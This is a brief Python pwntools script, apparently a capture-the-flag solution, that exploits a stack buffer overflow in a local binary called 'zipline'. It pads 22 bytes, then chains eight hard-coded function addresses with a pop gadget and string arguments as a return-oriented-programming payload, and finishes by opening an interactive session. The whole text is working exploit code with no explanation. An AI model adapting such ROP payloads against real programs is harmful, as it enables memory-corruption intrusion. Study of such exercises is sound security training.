from pwn import *

p=process("zipline")
p.recv()

funcs_strings = [[0x08049216, 0x0804a008],[0x0804926d, 0x0804a02f],[0x080492c4, 0x0804a04c],[0x0804931b, 0x0804a069],[0x08049372, 0x0804a086],[0x080493c9, 0x0804a0a3],[0x08049420, 0x0804a0c0],[0x08049477, 0x0804a0dd]]

chain = b"a"*(22)
POP_instruction = 0x08049021 
for i in range(len(funcs_strings)):
    chain += p32(funcs_strings[i][0]) + p32(POP_instruction) + p32(funcs_strings[i][1])

chain += p32(0x08049569)

p.sendline(chain)
p.interactive()
